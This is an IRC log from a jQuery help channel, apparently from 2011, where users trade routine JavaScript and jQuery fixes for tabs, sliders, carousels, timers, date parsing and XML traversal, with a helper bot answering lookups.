[13:14:00] <alaing> how do i read it and select the tab?
[13:14:31] <mightym> hey guys, i know it a js question, by im completely new to jquery/js: why cant i convert a date into a unixtimestamp this way: new Date("2011-05-13 17:36:02").getTime()
[13:14:36] <jovrtn> you can read the window.location object
[13:14:39] <jovrtn> for query strings
[13:15:07] <alexparker> .delegate( selector, eventType, eventData, handler ) is not working
[13:15:32] <alaing> jovrtn: i have managed to pick out the index and is returned to the page in a hidden element
[13:15:46] <Noble> Does anyone know of a script that resizes fonts based on window/screen height/width/ppi?
[13:15:55] <alexparker> .delegate( '.selector', 'click', {key: 'value'}, function(e) { e is undefined } )
[13:16:19] <jovrtn> i don't think you can accurately determine PPI within the browser
[13:16:21] <jovrtn> might be wrong though
[13:16:24] <RobW> wtf
[13:16:26] <RobW> new jquery is broken
[13:16:28] <alexparker> anyone know how to properly pass eventData when using delegate? it doesnt seem to work as documented
[13:16:40] <alaing> PPi?
[13:16:47] <jovrtn> pixels per inch
[13:16:54] <Noble> jovrtn: PPI is not important, I want my fonts to resize if the window resizes
[13:17:17] <jovrtn> Noble: you should check out css media queries for that
[13:17:40] <RobW> nevermind, apparently you now have to quote selector attributes, example (bad): a[href=blah.php] has to now be (good): a[href='blah.php']
[13:17:44] <RobW> meh.. makes sense
[13:18:17] <alexparker> delegate is broken?
[13:18:18] <alaing> jovrtn: how can i read my hidden element and set the tab to that index
[13:18:26] <Noble> jovrtn: I did, and if I got it correctly I need to do different stylesheets for every resolution I want to support. Now, if a simple script could just figure out what the size should be I would not need that.
[13:18:44] <gnarf> RobW: thats been since 1.5
[13:18:54] <gnarf> RobW: maybe even 1.4.4
[13:18:59] <jovrtn> Noble: not separate stylesheets, just separate media queries
[13:19:11] <jovrtn> alaing: shouldn't need a hidden element, one sec i'll link some code
[13:19:15] <gnarf> RobW: its required in CSS so we required it as well
[13:19:21] <RobW> gnarf: it couldn't have been, I was using 1.5.1 and everything was working until 1.6
[13:19:26] <RobW> :S
[13:19:33] <systemfault> gnarf: Good :)
[13:19:39] <RobW> yeah thats why I said it makes sense now hah
[13:19:45] <friskd> how do i set function names as defaultOptions in a plugins default config
[13:20:01] <systemfault> I'd be more evil, I'd remove every damn jQuery CSS extensions :P
[13:20:08] <systemfault> (For selectors)
[13:20:17] <gnarf> systemfault: the meta selectors are useful
[13:20:26] <systemfault> :last input:button and company.
[13:20:27] <phlp> mightym: Date.parse("2011/05/13 17:36:02")
[13:20:51] <friskd> when i set  {out:this.onHover}, the out variable is undefined.
[13:21:20] <mightym> phlp: ok, but you mean it will not work with "2011-05-13 17:36:02" ?
[13:21:53] <phlp> mightym: doesnt appear to
[13:22:05] <mightym> phlp: kk, thy a lot
[13:23:28] <jovrtn> alaing: sorry, back; so you're able to read the tabindex after the page is loaded?
[13:23:51] <alaing> yes
[13:24:01] <alaing> just hold on i think i got an example
[13:24:19] <alaing> but it keeps resubmit in a loop
[13:27:38] <jovrtn> alaing: you can do something like this: if ( window.location.search ) { $tabs.tabs("select",index); }
[13:27:57] <jovrtn> on page load
[13:28:30] <jovrtn> just use the tabs 'select' method to activate the proper tab
[13:29:08] <alaing> I have $tabs.tabs('select',$(':hidden').val()).tabs('select',function(e,ui){submitPage()});
[13:29:35] <alaing> its not sticking in a loop but its not setting to the index but the first one
[13:29:45] <alaing> $(':hidden').val() return 2
[13:29:56] <alaing> as the third tab was clicked
[13:30:30] <alaing> i'm not sure if i need the last.tabs()
[13:30:50] <alaing> i just want to hook into an event to submit the page
[13:30:52] <Noble> http://windyroad.org/static/resolution-independence/
[13:30:56] <Noble> THIS is what I'm talking about
[13:31:02] <Noble> Why does not everyone do this?
[13:31:39] <gf3> Noble: because that's retarded
[13:31:45] <Noble> why?
[13:31:55] <Noble> Pixels are retarded
[13:32:00] <Noble> ems are retarded
[13:32:13] <gf3> Noble: a better way of doing things: http://csswizardry.com/inuitcss/
[13:32:22] <gf3> Noble: http://cssgrid.net/
[13:32:29] <gf3> try resizing your browser
[13:33:39] <Noble> gf3: yeye thats media queries. Whats the point of making exceptions to every resolution out there when you can SCALE it?
[13:33:59] <Noble> people are not using VTs to watch their pages, this is not 1980
[13:34:43] <Kim^J> I'm desperate. I have a fancybox loading a form via ajax, then I submit the same form via ajax, after the form is submitted and I get back success, I want to close the fancybox. This is ******* impossible.
[13:34:53] <Kim^J> Oh yeah, it's a file-uploading form.
[13:36:02] <jovrtn> the fancybox script probably has a method to close it you can invoke in the ajax success callback
[13:36:15] <gf3> Noble: because that "scaling" does not actually scale
[13:36:32] <gf3> Noble: making the design/text smaller on a small screen device, will make it doubly small
[13:36:34] <alaing> jovrtn: can you see what i'm doing wrong?
[13:36:44] <alaing> I have $tabs.tabs('select',$(':hidden').val()).tabs('select',function(e,ui){submitPage()});
[13:36:57] <gf3> Noble: also it doesn't accomodate people who like to browse with a narrow window
[13:37:11] <jovrtn> alaing: submitting the page and loading the correct tab are two separate actions
[13:37:25] <jovrtn> you should pick the tab after the page load
[13:37:36] <Kim^J> jovrtn: parent.$.fancybox.close(); <-- Nope! $.fn.fancybox.close(); <-- Nope! $.fancybox.close(); <-- Nope!
[13:37:40] <alaing> how do i do that?
[13:37:56] <jovrtn> Kim^J: is close() throwing any console errors?
[13:38:01] <Kim^J> It's got something to do with an iframe that ajaxForm creates when it deals with file-uploads.
[13:38:10] <m1chael> http://honestbleeps.com/demos/jQuery-autocomplete-with-json-and-geonames/ # why is it, when you click a City,State-- do you only get the city name, and not the state name along with it? the code looks very simple, but i can't understand this
[13:38:32] <jovrtn> alaing: when/how is the hidden field value being set?
[13:38:33] <Noble> gf3: Well adding a min-size would solve that. I just cant believe that we do not have resolution independence in 2011..
[13:38:45] <gf3> Noble: well then what's the point
[13:39:05] <_foobar> what would u nsay would be a good speed to use for animations. 1/20ms ?
[13:39:11] <Kim^J> jovrtn: Nope, VS debugger tells me that 'wrap' is an undefined object or null.
[13:39:12] <alaing> jovrtn: I set it as part of the submitPage function()
[13:39:16] <orolo> m1chael: you need to return custom data and display: http://jqueryui.com/demos/autocomplete/#custom-data
[13:39:18] <dualcore> how can you get the visitors ip address with only javascript?
[13:39:25] <gf3> Noble: picture this on a 4" screen: http://dl.dropbox.com/u/2176065/20110513163737.png
[13:39:35] <draginx> dualcore: u using nodejs? :P
[13:39:47] <jovrtn> alaing: so, just perform a check whenever the page loads to see if hidden has a value
[13:40:01] <jovrtn> alaing: if there's a value, use tabs.('select')
[13:40:19] <Noble> gf3: I get your point, and the layout of this is stupid. If you had a larger font start with it would be much more logical.
[13:40:20] <jovrtn> if not, let the page load normally without manipulating the active tab
[13:40:21] <dualcore> draginx: no, what is that?
[13:40:30] <gf3> Noble: meh
[13:40:34] <m1chael> orolo::   line 16: rows[i] = { data:data[i], value:data[i].name, result:data[i].name }; # is that what i'd be changing?
[13:40:50] <Noble> gf3: You like having 500px on each side if your web page when browsing the web?
[13:40:50] <alaing> ok but am is my usage of the second .tabs right?
[13:40:52] <draginx> dualcore: server-side javascript
[13:41:00] <alaing> $tabs.tabs('select',$(':hidden').val()).tabs('select',function(e,ui){submitPage()});
[13:41:01] <Noble> gf3: Who uses 1024-monitors nowadays?
[13:41:18] <gf3> Noble: iPads do
[13:41:22] <jovrtn> it's the first tabs you have to worry about
[13:41:35] <Noble> Well, the PPI accomodates for that.
[13:41:46] <alaing> I understand the first tabs is to set it now
[13:41:53] <alaing> but is my second one right
[13:41:57] <jovrtn> the way you described it working
[13:42:06] <jovrtn> a user clicks on a tab and that submits the page
[13:42:13] <gf3> Noble: whitespace is a good thing sometimes
[13:42:26] <jovrtn> when the page reloads, you want a particular tab to be active instead of the first one
[13:42:28] <orolo> m1chael:  i *think* you want to look at the .data( "autocomplete" ). . . portion of the jQuery example; where it appends item.label etc.
[13:42:28] <Noble> gf3: Seriously, if you could just say "make this font this % width of the total resolution" it would be nice.
[13:42:39] <jovrtn> I would attach a click handler to the tab that submits the page
[13:42:42] <Klevre> I want to get the total number of divs with a specific class that have a specific word inside it, how would I do that?
[13:42:57] <Noble> gf3: I get your point, but having a web page scale like a vector should be doable.
[13:42:58] <jovrtn> like $('#tab5').click(function() { submitPage(); });
[13:43:07] <gf3> Noble: upload a PDF ;)
[13:43:13] <Noble> gf3: :)
[13:43:16] <orolo> Klevre $('.specificiv').contains('specificWorld).length ?
[13:43:30] <jovrtn> then separately, in $(window).load() or doc ready, use $tabs.tabs('select',$(':hidden').val());
[13:43:35] <alaing> jovrtn: i use goign to bind a click but i thought it would be better to use an ui.tabs events
[13:43:38] <orolo> Klevre: wait, you have to bundle that.
[13:43:49] <jovrtn> it probably doesn't matter too much
[13:44:04] <jovrtn> as long as you're capturing the user's click intention
[13:44:32] <alaing> jovrtn: excellant i think i was just over complicating things.....i tend to do that quiet a bit
[13:44:46] <jovrtn> yeah you could just use $tabs.tabs('select',function(e,ui){submitPage()});
[13:45:08] <alaing> bind click event and then use .tabs ('select' on ready
[13:45:29] <jovrtn> well
[13:45:37] <jovrtn> which tab are you using to submit the form
[13:45:44] <jovrtn> like, the last tab of the list or something like that?
[13:45:55] <alaing> jovrtn: at one stage it ended up locking the brows by submitting changing the tab which then submits the page again
[13:46:31] <alaing> jovrtn: i was thinking delegate a click event across all the tabs
[13:46:47] <jovrtn> oh
[13:47:16] <RobW> Is there a way to auto resize a divs height?
[13:47:22] <RobW> (based on its inner content)
[13:47:37] <jovrtn> i'm just trying to grasp how your form works
[13:47:50] <jovrtn> I assume the very last tab submits the form
[13:47:54] <alaing> oh i think i may have had the (select,function..) before setting it which of cause would cause a loop
[13:48:15] <gf3> RobW: yes, don't set a height
[13:48:38] <gf3> (aka auto)
[13:48:39] <alaing> jovrtn: its not a form in that a user enters data extra it
[13:48:46] <jovrtn> ah
[13:48:50] <alaing> each tab has a different report
[13:48:59] <RobW> gf3: that's the problem.
[13:49:00] <jovrtn> ohh I see
[13:49:11] <gf3> RobW: no it's the solution!
[13:49:12] <jovrtn> you just want to make sure that when they've clicked the tab, they're returned to the same tab when the page reloads
[13:49:12] <RobW> gf3: One second, I'll explain
[13:49:27] <alaing> yes
[13:49:54] <jovrtn> you can pass the clicked tab index to your submitPage function
[13:49:58] <jovrtn> and use that to set the hidden element value
[13:50:12] <alaing> i know its a bit long winded but its because i'm using orcalce application express
[13:50:26] <RobW> gf3: Check out http://36beta.com/web/naser/jewelry.php#!/4cs-of-diamonds.php - click on "Cut" or "Clarity" slide navigations
[13:50:52] <alaing> normally you would have a php script or something and just do an ajax call to it
[13:50:57] <gf3> ?minimal @ RobW
[13:50:57] <bot-t> RobW, A minimal test case should contain precisely the HTML and JavaScript necessary to demonstrate the problem, no more and no less. If it is more than 32 lines, it is probably not a minimal test case.
[13:51:14] <jovrtn> yeah
[13:51:14] <RobW> gf3: as you can tell - this is using jcarousellite - which needs a height set. the div.sli_txt is auto height expanding but it's parent needs to grab that height and apply accordingly
[13:51:17] <jovrtn> so
[13:51:58] <RobW> heh nevermind i'll figure something out
[13:52:01] <alaing> jovrtn: thanks again for your advice and support. much appreciated
[13:52:14] <jovrtn> sure thing
[13:52:28] <ravenzz> gf3 what's the matter? i'm joining the discussion right now
[13:52:37] <ravenzz> i read jcarousel and height
[13:52:37] <ravenzz> :P
[13:52:44] <gf3> ravenzz: talk to RobW
[13:53:24] <ravenzz> Fwd to rob
[13:53:40] <ravenzz> RobW what's the matte?
[13:53:41] <ravenzz> +r
[13:54:20] <gf3> his carousel plugin isn't grabbing the computed height of an element
[13:54:59] <sokie_de> RobW, cant u just set the height of the containers high enough to show the highst one properly?
[13:55:36] <sokie_de> looks like there's space enough
[13:55:40] <ravenzz> oh i should use the callback functions to adjust the height i suppose
[13:55:49] <ravenzz> he
[13:55:52] <ravenzz> not i :P
[13:55:59] <Klevre> I want to get the total number of divs with a specific class that have a specific word inside it, how would I do that?
[13:56:25] <RobW> sokie_de: thats what I was doing, but most slides have small heights
[13:56:32] <RobW> I fixed the problem anyhow in the jcarousel function :D
[13:56:42] <RobW> in the after end.. looks sleek now.
[13:56:52] <RobW> var curHeight = $(o).find('.sli_txt').height(); $(o).parent('ul').find('li').animate({'height': (curHeight+10)+'px'});
[13:56:53] <RobW> ftw
[13:57:02] <RobW> but can't I use siblings :|
[13:58:14] <sokie_de> wouldnt it be easier to set that hight ind you css for that class .sli_txt?
[13:59:23] <sokie_de> well my typing suc big time
[13:59:37] <sokie_de> *height in your css
[14:01:04] <m1chael> im working with this code: http://media.lmwblog.com/test.html # it's an autocomplete form that works with GeoNames, what would cause this form to act buggy? (i.e. when you first load the page, it doesnt work right away, it sees unreliable)
[14:01:41] <RobW> sokie_de: but the parents height wouldn't allow overflow
[14:02:04] <sokie_de> oic
[14:03:08] <sokie_de> is there no chance to fit the parents height to those childs
[14:03:11] <sokie_de> ?
[14:03:58] <sokie_de> your layout seems to provide the space to do that
[14:04:40] <RobW> sokie_de: the childs heights are the ones that are dynamic
[14:04:49] <RobW> and they don't want _any_ extra space
[14:05:18] <gf3> the carousel should accomodate whatever you send it
[14:05:26] <gf3> the height is easily calculable
[14:05:32] <ravenzz> RobW what's the main differences between jcarousel and jcarousellite?
[14:07:26] <ravenzz> mhm
[14:07:29] <ravenzz> gotta go
[14:07:31] <ravenzz> bye
[14:08:44] <RobW> not sure
[14:08:52] <RobW> http://36beta.com/web/naser/4cs-of-gemstones.php notice the div expansion.. but another problem *sigh*
[14:09:09] <RobW> the function afterEnd is only called on current elements until page content changes
[14:09:26] <RobW> (which is changed via ajax).. how would I refresh jquery to grab new elements of o?
[14:09:59] <LSshock> hi could anyone tell me how i can convert this time format (video time) 00:23 into just seconds also when it's 01:23 for example
[14:10:17] <RobW> see: http://pastebin.com/3BsZV9B0
[14:13:40] <RobW> LSshock: var time = "01:23"; var timeSeconds = parseInt(time.split(":")[0]*60)+parseInt(time.split(":")[1]); alert(timeSeconds);
[14:13:41] <sokie_de> anyway the last thing i'd try is to edit the script. there must be a way, to set height (and other properties) for both parent and child. If those are set via css, u wont experience any troubles. they just need to be high enough to fit those Element with the largest content
[14:14:08] <RobW> yes but I can't do that sokie_de because there's too much empty space between content and footer logos
[14:14:16] <RobW> if user is on a short div
[14:14:33] <sokie_de> oic
[14:14:44] <RobW> so what I did now, if you see site, is it will auto expand
[14:14:52] <RobW> but if you switch pages, the function doesn't work properlyt
[14:14:57] <RobW> see: http://pastebin.com/3BsZV9B0
[14:15:13] <Renegade001> Does anyone know if Sencha or jQTouch has a channel here?
[14:15:43] <RobW> sokie_de: then see results here: http://36beta.com/web/naser/4cs-of-gemstones.php
[14:15:44] <LSshock> RobW: hey this works, thanks a lot
[14:15:57] <sokie_de> oh... i didnt expect that 'clarity' content to be that high
[14:15:59] <RobW> but if you switch pages, the afterEnd function will keep changing the old elements
[14:16:03] <RobW> yea :/
[14:16:16] <RobW> switch between color and clarity and you'll see heh
[14:16:56] <RobW> but when you switch pages, since it's ajax calls, the afterEnd function isn't being called right or something...
[14:16:58] <RobW> since the dom changes.
[14:17:07] <RobW> thats why I was wondering if there's a way to "refresh" the function
[14:17:35] <sokie_de> in my browser (ff3.17) it slides back nicely
[14:17:52] <RobW> sokie_de: switch pages
[14:18:09] <RobW> to another education sub page
[14:20:11] <Juv1228> which mockup do you guys like best? A: http://hs.juvsoft.com:8080/demos/demo-02.htm
[14:20:15] <Juv1228> or B: http://hs.juvsoft.com:8080/
[14:21:15] <LSshock> anyone know how i can make my UI slider work like a duration bar for a audio player, when i change the width of the slider as the song is playing it freaks out, the handle is inside the slider div/becomes unusable
[14:21:35] <amh345> im not sure if this is a jquery issue or css, but im having an issue aligning a navigational list.  when i roll over "category 1" the next menu appears beside "category 2". i've been at it for an hour now.  can someone have a look? http://jsfiddle.net/hWbtH/
[14:23:07] <LSshock> amh345: you forgot to set the right framework http://jsfiddle.net/hWbtH/1/
[14:23:20] <amh345> LSshock: i found the problem :)
[14:23:25] <amh345> but you're right. id did
[14:23:33] <LSshock> the example doenst work
[14:23:48] <LSshock> but you solved it anyway?
[14:24:03] <amh345> i did.  i top top:1.45em :(
[14:24:07] <Juv1228> LSshock, not sure how jplayer does it, but you might wanna check their code
[14:24:12] <jovrtn> LSshock: when you load a new song, you can reset the max slider value option to match the song duration
[14:24:32] <jovrtn> $( ".selector" ).slider( "option", "max", 7 );
[14:24:56] <jovrtn> and then just use $slider.slider( "value" , [value] )  to update the current position
[14:25:08] <LSshock> jovrtn: well i have the seconds as it is playing, i set the progressbar (which is the slider) and it gains width to match the length of the progressbar
[14:25:19] <LSshock> the slider handler doesnt work anymore now
[14:25:34] <LSshock> jovrtn: that was going to be another question, thanks for that
[14:25:37] <jovrtn> are you using jPlayer?
[14:25:43] <LSshock> no
[14:25:45] <jovrtn> ah
[14:25:47] <LSshock> making my own thing
[14:25:48] <Juv1228> LSshock, i would
[14:25:54] <LSshock> Juv1228: i cant
[14:26:04] <Juv1228> class project or something?
[14:26:10] <LSshock> and this is my last remaining bug
[14:26:34] <Juv1228> either way, maybe take a look at jplayers source regarding how they do it
[14:26:49] <gnarf> systemfault: thanks for mentioning something about the CSS extensions -- I'm gonna be adding some extra notes to the docs on these selectors
[14:26:58] <jovrtn> LSshock: you shouldn't need to set the width of anything
[14:27:28] <gnarf> systemfault: http://cl.ly/1f1u2N1O3W1b0q1U2w1H :)
[14:27:38] <jovrtn> just set $slider.slider( "value" , [value]) in the playback polling function
[14:27:58] <LSshock> jovrtn: ok great :)
[14:29:09] <jovrtn> ^_^
[14:30:24] <Roadin> is there a way to make jquery preform repeated actions say every 30 seconds?
[14:30:31] <blindMoe> setInterval
[14:30:35] <blindMoe> or setTimeout
[14:30:47] <Roadin> thanks blindMoe
[14:30:50] <blindMoe> or .delay() I believe
[14:30:55] <blindMoe> ? $.delay
[14:30:56] <bot-t> blindMoe, .delay() - Set a timer to delay execution of subsequent items in the queue. http://api.jquery.com/delay/
[14:30:58] <jovrtn> ^ regular javascript, don't need jquery
[14:30:59] <RobW> ah fixed my issue
[14:31:08] <Brodingo> delay is for animation
[14:31:11] <Brodingo> use setTimeout
[14:31:37] <sokie_de> how did u do it, RobW?
[14:31:59] <Roadin> which one is better for all browsers? IE, Mozilla, Google, setTimeout or setInterval?
[14:32:22] <Roadin> jovrtn would use regular JS if I understood it bit better ;)
[14:32:44] <t4nkd> setInterval?
[14:32:54] <jovrtn> oh I meant that setInterval/setTimeout are regular javascript functions
[14:32:55] <Roadin> okay
[14:33:01] <Roadin> ahh
[14:33:04] <t4nkd> Yeah I thought...
[14:33:12] <jovrtn> that it's something handled by regular JS, not jquery black magic
[14:33:20] <t4nkd> yet*
[14:33:39] <Roadin> no wonder ... (feels like a noob again... no where near ready to be jquery ninja.)
[14:33:49] <sokie_de> jQuery isnt that black :-D
[14:34:11] <jovrtn> black magic I said
[14:34:21] <jovrtn> pure sorcery
[14:34:24] <Roadin> jquery is easy for me to understand coming from a php background :) hahaha...
[14:34:29] <Marz> there are a few interval plugins
[14:35:32] <Marz> ?g jquery wait pause
[14:35:33] <bot-t> Marz, .delay() ñ jQuery API - http://api.jquery.com/delay/
[14:36:39] <gnarf> ?setInterval
[14:36:40] <bot-t> http://www.erichynds.com/javascript/a-recursive-settimeout-pattern/
[14:36:44] <gnarf> Roadin: read that link
[14:37:43] <alexparker> least expensive way to find which element has the fewest children?
[14:38:14] <gnarf> alexparker: lolz, thats gonna be expensive no matter how you slice it
[14:38:18] <friskd> If an event that is on a timeout is set on an element, and the timeout has been called... so its waiting... is there anyway to stop the timeout from completing... if i realize that during the delay, i don't want it to be called...
[14:38:28] <jrockjiggz> $('div').children().length
[14:38:44] <gnarf> alexparker: like globally, or like you have a collection of elements you want to test?
[14:39:34] <alexparker> $('.column').each(function(i,e){ ...$(e).children().length... });
[14:39:45] <Roadin> what I needed gnarf ty :)
[14:39:46] <lastent> hi, I am trying to make a ajax request, and replace a content with the response text, but only if it was successful, how can I get the response text un the "success:" or "success()"?
[14:39:46] <alexparker> gnarf: which column has the least children
[14:39:52] <gnarf> alexparker: so you want the .column with the least children
[14:40:10] <Kricir> can someone in here help me figure out what I'm doing wrong in my script, im trying to pull text from a table created to keep scores and make it add all the numbers for total score http://pastie.org/1898331
[14:40:13] <alexparker> yeah
[14:40:24] <alexparker> gnarf: thast as far as i got in my brain
[14:40:56] <alexparker> not sur eif i should put that in an array and if there is a way to get the minimum valued element out of an array i dunno
[14:41:25] <gnarf> $('.column').map(function() { var el = $(this); return { el: el, kids: el.children().length }).get().sort(function(a,b) { return a.kids - b.kids; }).unshift().el
[14:42:08] <gnarf> not 100% sure "sort" returns the array
[14:42:21] <gnarf> but if it doesn't just split it into two operations
[14:42:28] <alexparker> eesh
[14:42:35] <gnarf> map/get/sort; sorted.unshift().el
[14:43:22] <gnarf> ?js [3,2,1].sort()
[14:43:24] <bot-t> gnarf: [1, 2, 3]
[14:43:28] <fructose> Does JQuery have anything for uploading files? If not, can someone suggest a plugin for uploading a single file with a progress bar (just need it to support all browsers)?
[14:43:31] <gnarf> yeah, so it does return the array
[14:43:54] <alexparker> woah nifty
[14:44:09] <alexparker> ?js [3,2,1,5,3,5,6].sort()
[14:44:10] <bot-t> alexparker: [1, 2, 3, 3, 5, 5, 6]
[14:44:17] <gnarf> ?js [3,2,1].sort().unshift()
[14:44:17] <bot-t> gnarf: 3
[14:44:25] <gnarf> ?js [3,2,1].sort().shift()
[14:44:26] <bot-t> gnarf: 1
[14:44:31] <gnarf> .shift() is what you want
[14:44:48] <alexparker> shift pops the first element out?
[14:44:51] <gnarf> so $('.column').map(...).get().sort(...).shift().el
[14:44:53] <gnarf> alexparker: yeah
[14:45:08] <gnarf> unshift pushes one in
[14:45:13] <gnarf> at the front
[14:45:19] <gnarf> i just got the logic backwards
[14:46:18] <gnarf> ?js [ {a: 1}, {a: 3}, {a:2} ].sort(function(a,b) { return a.a - b.a })
[14:46:19] <bot-t> gnarf: [{"a": 1}, {"a": 2}, {"a": 3}]
[14:46:27] <gnarf> coo i did get the sort function right
[14:49:05] <Kricir> var test = $("td.1b").toArray(); var y = 0; for (var i=0; i<test.length;i++){ x = y; var z = parseInt($(test[i]).text()); alert(z + x); 	y = z + x;} Returns NaN and I can't figure out why, some help?
[14:50:23] <phlp> parseInt($(test[i]).text(), 10);
[14:51:43] <Kricir> @phip: that worked great but can you tell me what that ten represented?
[14:53:09] <phlp> base 10 (decimal)
[14:53:25] <Kricir> ok
[14:55:30] <friskd> how can i delay hide
[14:55:37] <friskd> i don't want the fade out of hide.
[14:55:49] <friskd> so i can't do hide('slow');
[14:56:00] <friskd> i just want to wait a second, the hide.
[14:56:51] <Roadin> okay found out, do not want to add an alert to a loop :) hahahah
[14:57:27] <phlp> friskd: setTimeout(function() { $obj.hide(); }, 1000);
[14:57:34] <sokie_de> does that mouse finger still hurt :-D
[14:57:35] <jrockjiggz> ?delay @ friskd
[14:57:36] <bot-t> friskd, .delay(duration, [queueName]): Set a timer to delay execution of subsequent items in the queue. http://api.jquery.com/delay/
[14:57:46] <friskd> jrockjiggz: you can't delay just basic hide.
[14:57:47] <Soothsayer> Could anyone recommend a good up-to-date jquery  plugin for creating overlayed modals? with forms, etc in it. Would you recommend fancybox or colorbox?
[14:57:52] <friskd> you have to pass a param.
[14:57:55] <friskd> i don't want the fade effect
[14:58:09] <brianseeders> you should just use setTimeout if you can
[14:58:10] <jrockjiggz> why not face(0)
[14:58:13] <friskd> phlp: Why would jquery not just delay the regular hide.
[14:58:18] <jrockjiggz> fade(0)
[14:58:29] <phlp> friskd: because that is what setTimeout is for
[14:58:51] <friskd> phlp: seems like it could have just replaced it w/ delay...
[14:58:53] <jrockjiggz> why not use callbacks?
[14:59:00] <friskd> jrockjiggz: ?
[14:59:18] <jrockjiggz> callback is fired when animation is complete
[14:59:25] <phlp> well i'm assuming .hide() never goes in the queue which is what .delay delays
[14:59:35] <friskd> o.
[14:59:41] <friskd> i guess that makes sense.
[15:00:08] <friskd> just seems weird it can't go in the queue...
[15:01:21] <vityav> Hello all. Hopefully a simple question: Can I call a .get command from within an external javascript file/function?
[15:01:51] <brianseeders> .delay(1000).queue(function(){$(this).hide();});
[15:01:57] <brianseeders> also works
[15:02:24] <friskd> brianseeders:  ... i like that.
[15:02:26] <brianseeders> but setTimeout is probably better
[15:02:32] <friskd> hmm...
[15:03:05] <sokie_de> When a duration is provided, .hide() becomes an animation method. The .hide() method animates the width, height, and opacity of the matched elements simultaneously. << this sounds as if you just need to apply a duration to queue it..
[15:03:11] <sokie_de> (untested)
[15:03:44] <brianseeders> yeah that works too
[15:03:47] <brianseeders> just tried it
[15:03:52] <sokie_de> great
[15:06:23] <queuetip> i have a dialog with a text box on it, but when i try to do a $('#my_text_box_id').focus in the code that positions and sets the properties of the dialog or i try to focus the text box after it opens i get the textbox to focus for about 1/2 a second and then i lose focus on it, any tips / pointers?
[15:07:09] <Soothsayer> Could anyone recommend a good up-to-date jquery  plugin for creating overlayed modals? with forms, etc in it. Would you recommend fancybox or colorbox?
[15:07:15] <nanicoar> I need to call the stuff on the left from the stuff on the right, but I'm a noob writing Frankencode and I don't recognize the format of what I have on the left. -  http://jsbin.com/oteza4/2
[15:07:33] <jrockjiggz> queuetip: $('#el').focus(); doesn't work?
[15:07:56] <queuetip> jrockjiggz: it works for like 1/2 a second but then it loses focus after it opens
[15:08:10] <queuetip> jrockjiggz: including when i call .focus() after the .open method on the dialog
[15:08:23] <nanicoar> I didn't write the stuff on the left. Some Google guru did, before leaving that company.
[15:09:55] <nanicoar> It looks like it is inside out, but I don't know how to think that way. D:
[15:09:57] <queuetip> i use # when it's an id right?
[15:10:04] <nanicoar> yes
[15:11:36] <brianseeders> you lose focus as soon as you click in the box?
[15:12:02] <LSshock> im using animate(width, seconds) and it works but when the song reaches the point where it is still buffering the result in seconds is the same but the bar keeps growing 1px each time it gets set to animate width to x pixels
[15:12:25] <Klevre> I'm looping through a list with an each function, and inside it I'm appending to the same list, this creates a dead lock
[15:12:57] <Klevre> How do I prevent the newly appended list item from being iterated?
[15:13:44] <queuetip> i got it figured out, because i craete the dialog properties and then call open, the html doesn't exist when i call .focus() on the textbox in the dialog, i had to do setTimeout for 1/2 a second to get it to focus
[15:14:23] <coldhead> Klevre: add the new stuff to a string or an element not yet attached to the DOM and then append THAT to the list outside the loop
[15:14:27] <sokie_de> i'd think adding items by 'prepend' should do the trick
[15:15:06] <coldhead> you should avoid repeatedly inserting to the DOM anyway, try to do it all in one big hit
[15:16:44] <jamesdean77> is using "window.functionName =" jQuery frowned upon ?
[15:16:46] <brianseeders> could grab an array of references to the elements before appending anything and loop the array too
[15:17:17] <brianseeders> if you youre doing appends in the middle of the list and cant just do them all at the end
[15:18:21] <coldhead> like when you smoke crack
[15:19:14] <gnarf> jamesdean77: frowned upon in JavaScript
[15:19:15] <necromancer`> or DMT
[15:19:38] <necromancer`> jamesdean77: yeah...there's a reason why nobody likes prototype.js
[15:19:42] <coldhead> OR DMT
[15:20:16] <necromancer`> Soothsayer: i like facebox. you can put any HTML you want in there.
[15:20:26] <necromancer`> it looks pretty, and it's really easy to just drop in
[15:20:29] <skyl>   var img = $('img#samplePNG');  // how do I get the height and width of the png file?
[15:20:40] <Soothsayer> necromancer`: great, exactly what I want :)
[15:20:48] <necromancer`> skyl: .height() and .width()?
[15:20:50] <necromancer`> haha
[15:20:54] <necromancer`> are they not working for ya?
[15:21:22] <necromancer`> $('#mind').read();
[15:22:04] <skyl> necromancer, billiant, thanks
[15:22:40] <jamesdean77> @gnarf and @necromancer I ment "in jQuery" not jQuery it self silly
[15:23:10] <gnarf> jamesdean77: ???
[15:23:29] <gnarf> jamesdean77: we only use window. when we have to
[15:26:07] <jamesdean77> @gnarf I looked at the doc on how to extened jQuery with "jQuery.fn.myPlugin = function() {" but when I try to use it I does not work :(
[15:26:32] <LSshock> how can i interact with a div that has such a class as class="ui-slider-handle ui-state-default ui-corner-all" :s? its the slider handle
[15:26:45] <jamesdean77> How do you call it jQuery.functionName ?
[15:27:09] <LSshock> arg
[15:27:12] <LSshock> nevermind
[15:30:32] <ccmonster> anyone around
[15:31:06] <sokie_de> eyes wide shut
[15:31:08] <necromancer`> nope
[15:31:15] <Roadin> nope, everyone is on dinner break or slumber.
[15:32:36] <LSshock> can position() work on an div that has a left:; css value with %? i need the pixel position of the handle
[15:34:17] <necromancer`> why is it called jQuery anyway?
[15:34:24] <brianseeders> it depends if you need it relative to the document or another element
[15:34:24] <necromancer`> i feel like it should be called "Selectah" or something ;)
[15:34:24] <Prot> because its javascript
[15:34:26] <Prot> ... query
[15:37:05] <ccmonster> in xml if i have <category><category></category></category> how do I do a find for the top level "category" node?
[15:37:22] <gnarf> ccmonster: >category ?
[15:37:30] <ccmonster> >?
[15:37:38] <gnarf> direct child
[15:37:46] <gnarf> so like xml > category
[15:38:06] <ccmonster> $(xml).find(">category")?
[15:38:23] <gnarf> is it the root node?
[15:38:28] <Prot> can't you just do :first?
[15:38:36] <Prot> $(xml).find("category:first")
[15:38:43] <ccmonster> root is <categoryies>
[15:38:46] <ccmonster> typo*
[15:39:01] <gnarf> ccmonster: yeah, then $(xml).find(">category");
[15:39:05] <gnarf> or even
[15:39:10] <gnarf> $(xml).children("category")
[15:40:19] <ccmonster> interesting. it doesnt like that
[15:40:45] <LSshock> $("#timeslider").slider('value', timeSeconds); works but for max it doesnt :( anyone know why?
[15:41:07] <gnarf> ccmonster: what?
[15:41:14] <gnarf> ccmonster: see ?p
[15:41:15] <bot-t> ccmonster, Please paste your code at http://jsfiddle.net/ [preferred], http://paste.pocoo.org/+js or http://fixee.org/
[15:43:27] <jrockjiggz> anyone know of an audio player that can be controlled with js?
[15:47:33] <ccmonster> essentially i am trying to traverse this - http://pastie.org/1898549 and turn it into a navigation
